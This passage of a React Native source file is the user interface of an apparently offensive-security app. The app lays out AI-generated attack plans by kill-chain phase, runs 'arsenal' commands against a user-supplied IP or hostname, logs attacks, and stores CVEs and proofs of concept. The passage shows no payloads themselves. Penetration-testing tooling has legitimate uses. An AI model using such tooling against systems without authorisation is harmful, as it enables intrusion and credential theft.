                                style={({ pressed }) => [styles.analyzeBtn, pressed && { opacity: 0.7 }, isAnalyzing === step.id && { opacity: 0.5 }]}
                                onPress={() => handleAnalyzeOutput(step)}
                                disabled={isAnalyzing === step.id}
                              >
                                {isAnalyzing === step.id ? <ActivityIndicator size="small" color={Colors.primary} /> : <MaterialIcons name="psychology" size={11} color={Colors.primary} />}
                                <Text style={styles.analyzeBtnText}>AI ANALYZE</Text>
                              </Pressable>
                            </View>
                            <ScrollView style={{ maxHeight: 140 }} nestedScrollEnabled>
                              <Text style={[styles.codeText, { color: result.isError ? '#ff8888' : '#88ff88', fontSize: 11 }]} selectable>
                                {result.output}
                              </Text>
                            </ScrollView>
                          </View>
                        ) : null}

                        {/* AI Analysis */}
                        {analysis ? (
                          <View style={styles.analysisBox}>
                            <View style={styles.analysisHeader}>
                              <MaterialIcons name="psychology" size={12} color={Colors.primary} />
                              <Text style={styles.analysisTitle}>AI ANALYSIS</Text>
                            </View>
                            {analysis.error ? (
                              <Text style={{ color: Colors.danger, fontSize: 11 }}>{analysis.error}</Text>
                            ) : (
                              <>
                                {analysis.findings?.length > 0 ? (
                                  <><Text style={styles.analysisLabel}>FINDINGS</Text>
                                  {analysis.findings.map((f: string, i: number) => <Text key={i} style={styles.analysisBullet}>▸ {f}</Text>)}</>
                                ) : null}
                                {analysis.vulnerabilities?.length > 0 ? (
                                  <><Text style={styles.analysisLabel}>VULNERABILITIES</Text>
                                  {analysis.vulnerabilities.map((v: string, i: number) => <Text key={i} style={[styles.analysisBullet, { color: Colors.danger }]}>▸ {v}</Text>)}</>
                                ) : null}
                                {analysis.credentials?.length > 0 ? (
                                  <><Text style={styles.analysisLabel}>CREDENTIALS</Text>
                                  {analysis.credentials.map((c: string, i: number) => <Text key={i} style={[styles.analysisBullet, { color: Colors.warning }]}>▸ {c}</Text>)}</>
                                ) : null}
                                {analysis.next_steps?.length > 0 ? (
                                  <><Text style={styles.analysisLabel}>NEXT STEPS</Text>
                                  {analysis.next_steps.map((n: string, i: number) => <Text key={i} style={[styles.analysisBullet, { color: Colors.accent }]}>▸ {n}</Text>)}</>
                                ) : null}
                                {analysis.summary ? <Text style={styles.analysisSummary}>{analysis.summary}</Text> : null}
                              </>
                            )}
                          </View>
                        ) : null}
                      </View>
                    ) : null}
                  </View>
                );
              })}

              {/* Cleanup */}
              {attackPlan.cleanup && attackPlan.cleanup.length > 0 ? (
                <View style={styles.cleanupCard}>
                  <View style={styles.cleanupHeader}>
                    <MaterialIcons name="delete-sweep" size={13} color={Colors.accent} />
                    <Text style={styles.cleanupTitle}>CLEANUP COMMANDS</Text>
                  </View>
                  {attackPlan.cleanup.map((cmd, i) => (
                    <Text key={i} style={styles.cleanupCmd} selectable>$ {cmd}</Text>
                  ))}
                </View>
              ) : null}
            </View>
          )}
        </ScrollView>
      )}

      {/* ══ LOG ══ */}
      {activeTab === 'log' && (
        <View style={styles.flex}>
          <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.logStatsRow}>
            {[['Total', logStats.total, Colors.textSecondary], ['Cmds', logStats.commands, '#00ff41'], ['Attacks', logStats.attacks, '#ff2222'], ['Errors', logStats.errors, Colors.danger]].map(([l,v,c]) => (
              <View key={l as string} style={styles.logStatChip}>
                <Text style={[styles.statValue, { color: c as string }]}>{v as number}</Text>
                <Text style={styles.statLabel}>{l as string}</Text>
              </View>
            ))}
          </ScrollView>
          <View style={styles.searchBar}>
            <MaterialIcons name="search" size={15} color={Colors.textMuted} />
            <TextInput style={styles.searchInput} value={logSearch} onChangeText={setLogSearch} placeholder="Search commands, targets, outputs..." placeholderTextColor={Colors.textMuted} autoCapitalize="none" />
            {logSearch ? <Pressable onPress={() => setLogSearch('')} hitSlop={8}><MaterialIcons name="close" size={13} color={Colors.textMuted} /></Pressable> : null}
          </View>
          <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.chipRow}>
            {(['all','command','attack','exploit','analysis','recon'] as const).map(f => {
              const cfg = f !== 'all' ? LOG_TYPE_CFG[f] : null;
              return (
                <Pressable key={f} style={[styles.chip, logFilter===f && { borderColor: (cfg?.color||Colors.primary)+'55', backgroundColor: (cfg?.color||Colors.primary)+'11' }]} onPress={() => setLogFilter(f as any)}>
                  {cfg ? <MaterialIcons name={cfg.icon as any} size={10} color={logFilter===f?cfg.color:Colors.textMuted} /> : null}
                  <Text style={[styles.chipText, logFilter===f && { color: cfg?.color||Colors.primary }]}>{f === 'all' ? 'ALL' : cfg?.label}</Text>
                </Pressable>
              );
            })}
          </ScrollView>
          {logEntries.length === 0 ? (
            <View style={styles.empty}><MaterialIcons name="history-toggle-off" size={48} color={Colors.textMuted} /><Text style={styles.emptyTitle}>No log entries</Text><Text style={styles.emptySub}>Commands and attacks appear here automatically</Text></View>
          ) : (
            <FlatList
              data={filteredLog}
              keyExtractor={e => e.id}
              contentContainerStyle={[styles.list, { paddingBottom: insets.bottom + 110 }]}
              showsVerticalScrollIndicator={false}
              ListEmptyComponent={() => <View style={styles.empty}><Text style={styles.emptyTitle}>No matches</Text></View>}
              renderItem={({ item }) => {
                const cfg = LOG_TYPE_CFG[item.type];
                return (
                  <Pressable style={({ pressed }) => [styles.logEntry, pressed && { opacity: 0.8 }]} onPress={() => setSelectedLog(item)}>
                    <View style={[styles.logDot, { backgroundColor: cfg.color }]} />
                    <View style={styles.logBody}>
                      <View style={styles.cardTopRow}>
                        <View style={[styles.miniTag, { borderColor: cfg.color+'44', backgroundColor: cfg.color+'11' }]}><MaterialIcons name={cfg.icon as any} size={9} color={cfg.color} /><Text style={[styles.miniTagText, { color: cfg.color }]}>{cfg.label}</Text></View>
                        {item.target ? <View style={[styles.miniTag, { borderColor: Colors.warning+'33', backgroundColor: Colors.warning+'0d' }]}><Text style={[styles.miniTagText, { color: Colors.warning }]}>{item.target}</Text></View> : null}
                        {item.isError ? <View style={[styles.miniTag, { borderColor: Colors.danger+'44', backgroundColor: Colors.danger+'11' }]}><Text style={[styles.miniTagText, { color: Colors.danger }]}>ERROR</Text></View> : null}
                        <Text style={styles.cardTime}>{formatTime(new Date(item.timestamp))}</Text>
                      </View>
                      <Text style={[styles.logCmd, { color: cfg.color }]} numberOfLines={1}>$ {item.command}</Text>
                      {item.output ? <Text style={[styles.logOutput, item.isError && { color: Colors.danger+'aa' }]} numberOfLines={2}>{item.output}</Text> : null}
                    </View>
                  </Pressable>
                );
              }}
            />
          )}
        </View>
      )}

      {/* ══ ATTACK DETAIL MODAL ══ */}
      <Modal visible={selectedAttack !== null} transparent animationType="slide" onRequestClose={() => setSelectedAttack(null)}>
        <View style={styles.modalOverlay}>
          <View style={styles.modalSheet}>
            {selectedAttack ? (() => {
              const sev = SEV_CFG[selectedAttack.severity]; const typ = TYPE_CFG[selectedAttack.type]; const sta = STATUS_CFG[selectedAttack.status];
              return (
                <>
                  <View style={styles.modalHandle} />
                  <View style={styles.modalHeader}>
                    <View style={[styles.miniTag, { borderColor: typ.color+'55', backgroundColor: typ.color+'11' }]}><MaterialIcons name={typ.icon as any} size={10} color={typ.color} /><Text style={[styles.miniTagText, { color: typ.color }]}>{typ.label}</Text></View>
                    <View style={styles.modalHeaderRight}>
                      <Pressable onPress={() => { setEditDraft({...selectedAttack}); setShowAttackForm(true); setSelectedAttack(null); }} hitSlop={8}><MaterialIcons name="edit" size={19} color={Colors.textMuted} /></Pressable>
                      <Pressable onPress={() => setSelectedAttack(null)} hitSlop={8}><MaterialIcons name="close" size={21} color={Colors.textMuted} /></Pressable>
                    </View>
                  </View>
                  <ScrollView showsVerticalScrollIndicator={false} style={{ maxHeight: 400 }}>
                    <Text style={styles.modalTitle}>{selectedAttack.title}</Text>
                    <View style={styles.badgeRow}>
                      <View style={[styles.miniTag, { borderColor: sev.color+'55', backgroundColor: sev.color+'11' }]}><Text style={[styles.miniTagText, { color: sev.color }]}>{sev.label}</Text></View>
                      <View style={[styles.miniTag, { borderColor: sta.color+'44', backgroundColor: sta.color+'11' }]}><MaterialIcons name={sta.icon as any} size={9} color={sta.color} /><Text style={[styles.miniTagText, { color: sta.color }]}>{sta.label}</Text></View>
                      {selectedAttack.cvssScore !== undefined ? <View style={styles.miniTag}><Text style={styles.miniTagText}>CVSS {selectedAttack.cvssScore.toFixed(1)}</Text></View> : null}
                    </View>
                    {selectedAttack.cve ? <Text style={styles.infoRow}><Text style={styles.infoLabel}>CVE  </Text><Text style={{ color: Colors.warning }}>{selectedAttack.cve}</Text></Text> : null}
                    {selectedAttack.mitreId ? <Text style={styles.infoRow}><Text style={styles.infoLabel}>MITRE  </Text><Text style={{ color: Colors.accent }}>{selectedAttack.mitreId}</Text></Text> : null}
                    {selectedAttack.target ? <Text style={styles.infoRow}><Text style={styles.infoLabel}>Target  </Text>{selectedAttack.target}</Text> : null}
                    <Text style={styles.sectionLabel}>DESCRIPTION</Text>
                    <Text style={styles.bodyText}>{selectedAttack.description}</Text>
                    {selectedAttack.proofOfConcept ? <><Text style={styles.sectionLabel}>PROOF OF CONCEPT</Text><View style={styles.codeBlock}><Text style={styles.codeText}>{selectedAttack.proofOfConcept}</Text></View></> : null}
                    {selectedAttack.notes ? <><Text style={styles.sectionLabel}>NOTES</Text><Text style={styles.bodyText}>{selectedAttack.notes}</Text></> : null}
                  </ScrollView>
                  <View style={styles.modalActions}>
                    <Pressable style={({ pressed }) => [styles.dangerBtn, pressed && { opacity: 0.7 }]} onPress={() => handleDeleteAttack(selectedAttack.id)}>
                      <MaterialIcons name="delete-outline" size={15} color={Colors.danger} /><Text style={styles.dangerBtnText}>DELETE</Text>
                    </Pressable>
                    <Pressable style={({ pressed }) => [styles.primaryBtn, pressed && { opacity: 0.8 }]} onPress={() => handleAttackDeepDive(selectedAttack)}>
                      <MaterialIcons name="terminal" size={15} color={Colors.bg} /><Text style={styles.primaryBtnText}>DEEP DIVE</Text>
                    </Pressable>
                  </View>
                </>
              );
            })() : null}
          </View>
        </View>
      </Modal>

      {/* ══ ATTACK FORM MODAL ══ */}
      <Modal visible={showAttackForm && editDraft !== null} transparent animationType="slide" onRequestClose={() => { setShowAttackForm(false); setEditDraft(null); }}>
        <KeyboardAvoidingView style={styles.modalOverlay} behavior={Platform.OS==='ios'?'padding':'height'}>
          <View style={[styles.modalSheet, { maxHeight: '93%' }]}>
            {editDraft ? (
              <>
                <View style={styles.modalHandle} />
                <View style={styles.modalHeader}>
                  <Text style={styles.modalTitle}>{editDraft.title ? 'EDIT ATTACK' : 'LOG ATTACK'}</Text>
                  <Pressable onPress={() => { setShowAttackForm(false); setEditDraft(null); }} hitSlop={8}><MaterialIcons name="close" size={21} color={Colors.textMuted} /></Pressable>
                </View>
                <ScrollView showsVerticalScrollIndicator={false} keyboardShouldPersistTaps="handled">
                  {[
                    { label: 'TITLE *', key: 'title', ph: 'e.g. Log4Shell RCE via JNDI' },
                    { label: 'CVE', key: 'cve', ph: 'CVE-2024-XXXXX' },
                    { label: 'MITRE ID', key: 'mitreId', ph: 'T1190' },
                    { label: 'TARGET', key: 'target', ph: 'System, app, or network' },
                    { label: 'CVSS', key: 'cvssScore', ph: '0.0 – 10.0', keyboardType: 'decimal-pad' as const },
                  ].map(f => (
                    <View key={f.key} style={styles.formGroup}>
                      <Text style={styles.formLabel}>{f.label}</Text>
                      <TextInput style={styles.formInput} value={String((editDraft as any)[f.key] ?? '')} onChangeText={v => setEditDraft((d: any) => d ? { ...d, [f.key]: f.key==='cvssScore'? (v ? parseFloat(v) : undefined) : v } : d)} placeholder={f.ph} placeholderTextColor={Colors.textMuted} keyboardType={f.keyboardType} />
                    </View>
                  ))}
                  <View style={styles.formGroup}>
                    <Text style={styles.formLabel}>TYPE</Text>
                    <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.chipRow}>
                      {ATTACK_TYPES.map(t => { const c = TYPE_CFG[t]; const sel = editDraft.type===t; return <Pressable key={t} style={[styles.chip, sel && { borderColor: c.color+'66', backgroundColor: c.color+'18' }]} onPress={() => setEditDraft((d: any) => d ? { ...d, type: t } : d)}><MaterialIcons name={c.icon as any} size={11} color={sel?c.color:Colors.textMuted} /><Text style={[styles.chipText, sel && { color: c.color }]}>{c.label}</Text></Pressable>; })}
                    </ScrollView>
                  </View>
                  <View style={styles.formGroup}>
                    <Text style={styles.formLabel}>SEVERITY</Text>
                    <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.chipRow}>
                      {ATTACK_SEVERITIES.map(s => { const c = SEV_CFG[s]; const sel = editDraft.severity===s; return <Pressable key={s} style={[styles.chip, sel && { borderColor: c.color+'66', backgroundColor: c.color+'18' }]} onPress={() => setEditDraft((d: any) => d ? { ...d, severity: s } : d)}><Text style={[styles.chipText, sel && { color: c.color }]}>{c.label}</Text></Pressable>; })}
                    </ScrollView>
                  </View>
                  <View style={styles.formGroup}>
                    <Text style={styles.formLabel}>STATUS</Text>
                    <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.chipRow}>
                      {ATTACK_STATUSES.map(s => { const c = STATUS_CFG[s]; const sel = editDraft.status===s; return <Pressable key={s} style={[styles.chip, sel && { borderColor: c.color+'66', backgroundColor: c.color+'18' }]} onPress={() => setEditDraft((d: any) => d ? { ...d, status: s } : d)}><MaterialIcons name={c.icon as any} size={11} color={sel?c.color:Colors.textMuted} /><Text style={[styles.chipText, sel && { color: c.color }]}>{c.label}</Text></Pressable>; })}
                    </ScrollView>
                  </View>
                  <View style={styles.formGroup}>
                    <Text style={styles.formLabel}>DESCRIPTION *</Text>
                    <TextInput style={[styles.formInput, { minHeight: 80, textAlignVertical: 'top' }]} value={editDraft.description} onChangeText={v => setEditDraft((d: any) => d ? { ...d, description: v } : d)} placeholder="Vulnerability description, impact..." placeholderTextColor={Colors.textMuted} multiline />
                  </View>
                  <View style={styles.formGroup}>
                    <Text style={styles.formLabel}>PROOF OF CONCEPT</Text>
                    <TextInput style={[styles.formInput, { minHeight: 70, textAlignVertical: 'top', fontFamily: MONO, fontSize: 12 }]} value={editDraft.proofOfConcept||''} onChangeText={v => setEditDraft((d: any) => d ? { ...d, proofOfConcept: v } : d)} placeholder="Commands, payloads..." placeholderTextColor={Colors.textMuted} multiline autoCapitalize="none" autoCorrect={false} />
                  </View>
                  <View style={styles.formGroup}>
                    <Text style={styles.formLabel}>NOTES</Text>
                    <TextInput style={[styles.formInput, { minHeight: 60, textAlignVertical: 'top' }]} value={editDraft.notes} onChangeText={v => setEditDraft((d: any) => d ? { ...d, notes: v } : d)} placeholder="Operational notes..." placeholderTextColor={Colors.textMuted} multiline />
                  </View>
                  <View style={styles.formGroup}>
                    <Text style={styles.formLabel}>TAGS (comma-separated)</Text>
                    <TextInput style={styles.formInput} value={editDraft.tags.join(', ')} onChangeText={v => setEditDraft((d: any) => d ? { ...d, tags: v.split(',').map((t: string) => t.trim()).filter(Boolean) } : d)} placeholder="rce, web, windows" placeholderTextColor={Colors.textMuted} autoCapitalize="none" />
                  </View>
                  <Pressable style={({ pressed }) => [styles.primaryBtn, { marginVertical: Spacing.base }, pressed && { opacity: 0.8 }, (!editDraft.title||!editDraft.description) && styles.btnDisabled]} onPress={() => editDraft && handleSaveAttack(editDraft)} disabled={!editDraft.title||!editDraft.description}>
                    <MaterialIcons name="save" size={16} color={Colors.bg} /><Text style={styles.primaryBtnText}>SAVE ATTACK</Text>
                  </Pressable>
                  <View style={{ height: 40 }} />
                </ScrollView>
              </>
            ) : null}
          </View>
        </KeyboardAvoidingView>
      </Modal>

      {/* ══ ARSENAL DETAIL MODAL ══ */}
      <Modal visible={selectedArsenal !== null && !showExecResult} transparent animationType="slide" onRequestClose={() => setSelectedArsenal(null)}>
        <View style={styles.modalOverlay}>
          <View style={[styles.modalSheet, { maxHeight: '90%' }]}>
            {selectedArsenal ? (
              <>
                <View style={styles.modalHandle} />
                <View style={styles.modalHeader}>
                  <View style={[styles.arsenalIcon, { backgroundColor: selectedArsenal.color+'15', borderColor: selectedArsenal.color+'33', width: 34, height: 34 }]}>
                    <MaterialIcons name={selectedArsenal.icon as any} size={16} color={selectedArsenal.color} />
                  </View>
                  <Pressable onPress={() => setSelectedArsenal(null)} hitSlop={8}><MaterialIcons name="close" size={21} color={Colors.textMuted} /></Pressable>
                </View>
                <ScrollView showsVerticalScrollIndicator={false} keyboardShouldPersistTaps="handled">
                  <Text style={styles.modalTitle}>{selectedArsenal.name}</Text>
                  <View style={styles.badgeRow}>
                    {selectedArsenal.mitreId ? <View style={[styles.miniTag, { borderColor: Colors.accent+'44', backgroundColor: Colors.accentMuted }]}><Text style={[styles.miniTagText, { color: Colors.accent }]}>{selectedArsenal.mitreId}</Text></View> : null}
                    <View style={styles.miniTag}><Text style={styles.miniTagText}>{selectedArsenal.category}</Text></View>
                  </View>
                  <Text style={styles.bodyText}>{selectedArsenal.description}</Text>
                  <Text style={styles.sectionLabel}>TARGET</Text>
                  <View style={[styles.targetBar, { marginBottom: Spacing.sm }]}>
                    <MaterialIcons name="gps-fixed" size={13} color={Colors.warning} />
                    <TextInput style={styles.targetInput} value={arsenalTarget} onChangeText={setArsenalTarget} placeholder="IP / hostname" placeholderTextColor={Colors.textMuted} autoCapitalize="none" autoCorrect={false} />
                  </View>
                  <Text style={styles.sectionLabel}>COMMAND</Text>
                  <View style={styles.codeBlock}>
                    <Text style={[styles.codeText, { color: Colors.accent }]} selectable>{buildCmd(selectedArsenal.command, arsenalTarget)}</Text>
                  </View>
                  <View style={{ height: Spacing.base }} />
                </ScrollView>
                <Pressable style={({ pressed }) => [styles.primaryBtn, pressed && { opacity: 0.8 }, isExecuting && styles.btnDisabled]} onPress={() => handleRunArsenal(selectedArsenal)} disabled={isExecuting}>
                  {isExecuting ? <ActivityIndicator size="small" color={Colors.bg} /> : <MaterialIcons name="play-arrow" size={18} color={Colors.bg} />}
                  <Text style={styles.primaryBtnText}>{isExecuting ? 'EXECUTING...' : arsenalTarget ? `EXECUTE ON ${arsenalTarget}` : 'EXECUTE (REAL LINUX)'}</Text>
                </Pressable>
              </>
            ) : null}
          </View>
        </View>
      </Modal>

      {/* ══ EXEC RESULT MODAL ══ */}
      <Modal visible={showExecResult} transparent animationType="slide" onRequestClose={() => { setShowExecResult(false); setSelectedArsenal(null); }}>
        <View style={styles.modalOverlay}>
          <View style={[styles.modalSheet, { maxHeight: '90%' }]}>
            <View style={styles.modalHandle} />
            <View style={styles.modalHeader}>
              <View style={styles.resultHeaderLeft}>
                {isExecuting ? <ActivityIndicator size="small" color={Colors.accent} /> : <View style={[styles.resultDot, { backgroundColor: execError?Colors.danger:Colors.accent }]} />}
                <Text style={[styles.modalTitle, { color: execError?Colors.danger:Colors.accent, fontSize: Typography.base }]}>{isExecuting?'EXECUTING...':execError?'ERROR':'COMPLETE'}</Text>
              </View>
              {!isExecuting ? <Pressable onPress={() => { setShowExecResult(false); setSelectedArsenal(null); setExecOutput(''); }} hitSlop={8}><MaterialIcons name="close" size={21} color={Colors.textMuted} /></Pressable> : null}
            </View>
            <ScrollView showsVerticalScrollIndicator={false} style={{ flex: 1 }}>
              <View style={[styles.codeBlock, execError && { borderColor: Colors.danger+'33' }]}>
                {isExecuting ? <View style={{ flexDirection: 'row', alignItems: 'center', gap: 10 }}><ActivityIndicator size="small" color={Colors.accent} /><Text style={{ color: Colors.accent, fontSize: Typography.sm }}>Executing on real Linux sandbox...</Text></View> : <Text style={[styles.codeText, { color: execError?Colors.danger:Colors.accent }]} selectable>{execOutput||'(awaiting output...)'}</Text>}
              </View>
              <View style={{ height: 32 }} />
            </ScrollView>
            {!isExecuting ? <Pressable style={({ pressed }) => [styles.primaryBtn, pressed && { opacity: 0.8 }]} onPress={() => { setShowExecResult(false); setSelectedArsenal(null); setExecOutput(''); setActiveTab('log'); }}><MaterialIcons name="check" size={15} color={Colors.bg} /><Text style={styles.primaryBtnText}>DONE — VIEW LOG</Text></Pressable> : null}
          </View>
        </View>
      </Modal>

      {/* ══ LOG DETAIL MODAL ══ */}
      <Modal visible={selectedLog !== null} transparent animationType="slide" onRequestClose={() => setSelectedLog(null)}>
        <View style={styles.modalOverlay}>
          <View style={[styles.modalSheet, { maxHeight: '90%', flex: 1 }]}>
            {selectedLog ? (() => {
              const cfg = LOG_TYPE_CFG[selectedLog.type];
              return (
                <>
                  <View style={styles.modalHandle} />
                  <View style={styles.modalHeader}>
                    <View style={[styles.miniTag, { borderColor: cfg.color+'55', backgroundColor: cfg.color+'11' }]}><MaterialIcons name={cfg.icon as any} size={10} color={cfg.color} /><Text style={[styles.miniTagText, { color: cfg.color }]}>{cfg.label}</Text></View>
                    <View style={styles.modalHeaderRight}>
                      <Pressable onPress={async () => { try { await Share.share({ message: `AXIOM LOG\n${new Date(selectedLog.timestamp).toLocaleString()}\n\n$ ${selectedLog.command}\n\n${selectedLog.output}` }); } catch {} }} hitSlop={8}><MaterialIcons name="share" size={17} color={Colors.textMuted} /></Pressable>
                      <Pressable onPress={async () => { const u = await deleteExecLogEntry(selectedLog.id); setLogEntries(u); setSelectedLog(null); }} hitSlop={8}><MaterialIcons name="delete-outline" size={19} color={Colors.danger} /></Pressable>
                      <Pressable onPress={() => setSelectedLog(null)} hitSlop={8}><MaterialIcons name="close" size={21} color={Colors.textMuted} /></Pressable>
                    </View>
                  </View>
                  <ScrollView showsVerticalScrollIndicator={false} style={{ flex: 1 }}>
                    <Text style={styles.sectionLabel}>COMMAND</Text>
                    <View style={[styles.codeBlock, { borderColor: cfg.color+'33' }]}><Text style={[styles.codeText, { color: cfg.color }]} selectable>{selectedLog.command}</Text></View>
                    <Text style={styles.sectionLabel}>OUTPUT</Text>
                    <View style={[styles.codeBlock, selectedLog.isError && { borderColor: Colors.danger+'44' }]}><Text style={[styles.codeText, { color: selectedLog.isError?Colors.danger:Colors.accent }]} selectable>{selectedLog.output||'(no output)'}</Text></View>
                    <View style={{ height: 32 }} />
                  </ScrollView>
                </>
              );
            })() : null}
          </View>
        </View>
      </Modal>

      {/* ══ CLEAR CONFIRM ══ */}
      <Modal visible={showClearConfirm} transparent animationType="fade" onRequestClose={() => setShowClearConfirm(false)}>
        <View style={styles.confirmOverlay}>
          <View style={styles.confirmBox}>
            <MaterialIcons name="warning" size={32} color={Colors.danger} />
            <Text style={styles.modalTitle}>Clear All Logs?</Text>
            <Text style={styles.bodyText}>Permanently delete {logEntries.length} entries.</Text>
            <View style={styles.modalActions}>
              <Pressable style={({ pressed }) => [styles.dangerBtn, { flex: 1, justifyContent: 'center' }, pressed && { opacity: 0.7 }]} onPress={() => setShowClearConfirm(false)}><Text style={styles.dangerBtnText}>CANCEL</Text></Pressable>
              <Pressable style={({ pressed }) => [styles.primaryBtn, { flex: 1, justifyContent: 'center', backgroundColor: Colors.danger }, pressed && { opacity: 0.7 }]} onPress={handleClearLog}><Text style={styles.primaryBtnText}>CLEAR ALL</Text></Pressable>
            </View>
          </View>
        </View>
      </Modal>

      {/* ══ KILL CHAIN VISUALIZATION MODAL ══ */}
      <Modal visible={showKillChain && attackPlan !== null} transparent animationType="slide" onRequestClose={() => setShowKillChain(false)}>
        <View style={styles.modalOverlay}>
          <View style={[styles.modalSheet, { maxHeight: '92%' }]}>
            <View style={styles.modalHandle} />
            <View style={styles.modalHeader}>
              <MaterialIcons name="account-tree" size={16} color={Colors.accent} />
              <Text style={[styles.modalTitle, { color: Colors.accent }]}>KILL CHAIN</Text>
              <Pressable onPress={() => setShowKillChain(false)} hitSlop={8} style={{ marginLeft: 'auto' }}>
                <MaterialIcons name="close" size={21} color={Colors.textMuted} />
              </Pressable>
            </View>
            {attackPlan ? (
              <ScrollView showsVerticalScrollIndicator={false}>
                {/* Horizontal phase timeline */}
                <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={{ flexDirection: 'row', alignItems: 'center', paddingVertical: Spacing.md, gap: 0 }}>
                  {(() => {
                    const phaseMap: Record<string, AttackStep[]> = {};
                    attackPlan.steps.forEach(s => { if (!phaseMap[s.phase]) phaseMap[s.phase] = []; phaseMap[s.phase].push(s); });
                    const phases = Object.entries(phaseMap);
                    return phases.map(([phase, steps], pIdx) => {
                      const phaseColor = PHASE_COLORS[phase] || Colors.textMuted;
                      const stepsDone = steps.filter(s => !!stepResults[s.id]).length;
                      const stepsFailed = steps.filter(s => stepResults[s.id]?.isError).length;
                      const allDone = stepsDone === steps.length;
                      const nodeColor = allDone ? (stepsFailed > 0 ? Colors.danger : Colors.accent) : stepsDone > 0 ? Colors.warning : Colors.textMuted;
                      return (
                        <View key={phase} style={{ flexDirection: 'row', alignItems: 'center' }}>
                          <View style={{ width: 76, alignItems: 'center', gap: 5, padding: 8, borderRadius: Radius.md, borderWidth: 1, borderColor: nodeColor + '55', backgroundColor: nodeColor + '11' }}>
                            <MaterialIcons
                              name={allDone && stepsFailed === 0 ? 'check-circle' : allDone ? 'cancel' : stepsDone > 0 ? 'play-circle' : 'radio-button-unchecked'}
                              size={18}
                              color={nodeColor}
                            />
                            <Text style={{ color: nodeColor, fontSize: 8, fontWeight: Typography.bold, textAlign: 'center', lineHeight: 11 }} numberOfLines={2}>{phase}</Text>
                            <Text style={{ color: Colors.textMuted, fontSize: 8, fontFamily: MONO }}>{stepsDone}/{steps.length}</Text>
                          </View>
                          {pIdx < phases.length - 1 ? <View style={{ width: 16, height: 2, backgroundColor: nodeColor + '66', marginHorizontal: 2 }} /> : null}
                        </View>
                      );
                    });
                  })()}
                </ScrollView>

                {/* Steps grouped by phase */}
                {(() => {
                  const phaseMap: Record<string, AttackStep[]> = {};
                  attackPlan.steps.forEach(s => { if (!phaseMap[s.phase]) phaseMap[s.phase] = []; phaseMap[s.phase].push(s); });
                  return Object.entries(phaseMap).map(([phase, steps]) => {
                    const phaseColor = PHASE_COLORS[phase] || Colors.textMuted;
                    return (
                      <View key={phase} style={{ marginTop: Spacing.md }}>
                        <View style={{ flexDirection: 'row', alignItems: 'center', gap: Spacing.sm, marginBottom: 6 }}>
                          <View style={[styles.miniTag, { borderColor: phaseColor + '55', backgroundColor: phaseColor + '18', paddingHorizontal: 8 }]}>
                            <Text style={[styles.miniTagText, { color: phaseColor, fontSize: 10 }]}>{phase}</Text>
                          </View>
                          <View style={{ flex: 1, height: 1, backgroundColor: Colors.surfaceBorder }} />
                        </View>
                        {steps.map(step => {
                          const result = stepResults[step.id];
                          const riskColor = RISK_COLORS[step.risk] || Colors.textMuted;
                          return (
                            <View key={step.id} style={{ flexDirection: 'row', alignItems: 'center', gap: Spacing.sm, paddingVertical: 7, paddingHorizontal: Spacing.sm, backgroundColor: Colors.surface, borderRadius: Radius.sm, marginBottom: 4, borderWidth: 1, borderColor: result ? (result.isError ? Colors.danger + '22' : Colors.accent + '22') : Colors.surfaceBorder }}>
                              <MaterialIcons
                                name={result ? (result.isError ? 'cancel' : 'check-circle') : 'radio-button-unchecked'}
                                size={14}
                                color={result ? (result.isError ? Colors.danger : Colors.accent) : Colors.textMuted}
                              />
                              <Text style={styles.stepName} numberOfLines={1}>{step.name}</Text>
                              {step.mitre_id ? <Text style={[styles.miniTagText, { color: Colors.accent, fontFamily: MONO }]}>{step.mitre_id}</Text> : null}
                              <View style={[styles.miniTag, { borderColor: riskColor + '44', backgroundColor: riskColor + '0d' }]}>
                                <Text style={[styles.miniTagText, { color: riskColor }]}>{step.risk?.toUpperCase()}</Text>
                              </View>
                            </View>
                          );
                        })}
                      </View>
                    );
                  });
                })()}
                <View style={{ height: 24 }} />
              </ScrollView>
            ) : null}
          </View>
        </View>
      </Modal>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  safe: { flex: 1, backgroundColor: Colors.bg },
  flex: { flex: 1 },
  header: { flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between', paddingHorizontal: Spacing.base, paddingVertical: Spacing.md, borderBottomWidth: 1, borderBottomColor: Colors.surfaceBorder },
  headerTitle: { color: Colors.textPrimary, fontSize: Typography.xl, fontWeight: Typography.bold, letterSpacing: 3 },
  headerRight: { flexDirection: 'row', gap: Spacing.sm, alignItems: 'center' },
  addBtn: { flexDirection: 'row', alignItems: 'center', gap: 4, backgroundColor: Colors.primary, paddingHorizontal: Spacing.md, paddingVertical: 7, borderRadius: Radius.full, ...Shadow.redGlow },
  addBtnText: { color: Colors.bg, fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 1.5 },
  logActions: { flexDirection: 'row', gap: Spacing.sm },
  iconBtn: { width: 32, height: 32, justifyContent: 'center', alignItems: 'center', backgroundColor: Colors.surface, borderRadius: Radius.full, borderWidth: 1, borderColor: Colors.surfaceBorder },
  subTabBar: { flexDirection: 'row', borderBottomWidth: 1, borderBottomColor: Colors.surfaceBorder, backgroundColor: Colors.bgSecondary },
  subTab: { flex: 1, flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: 5, paddingVertical: 10, borderBottomWidth: 2, borderBottomColor: 'transparent' },
  subTabText: { color: Colors.textMuted, fontSize: Typography.xs, fontWeight: Typography.bold, letterSpacing: 0.5 },
  statsBar: { flexDirection: 'row', alignItems: 'center', paddingVertical: Spacing.sm, borderBottomWidth: 1, borderBottomColor: Colors.surfaceBorder, backgroundColor: Colors.surface },
  stat: { flex: 1, alignItems: 'center' },
  statValue: { color: Colors.textPrimary, fontSize: Typography.base, fontWeight: Typography.bold },
  statLabel: { color: Colors.textMuted, fontSize: 9, fontWeight: Typography.bold, letterSpacing: 0.5, marginTop: 1 },
  searchBar: { flexDirection: 'row', alignItems: 'center', gap: Spacing.sm, marginHorizontal: Spacing.base, marginVertical: Spacing.sm, backgroundColor: Colors.surface, borderWidth: 1, borderColor: Colors.surfaceBorder, borderRadius: Radius.xl, paddingHorizontal: Spacing.md, paddingVertical: 8 },
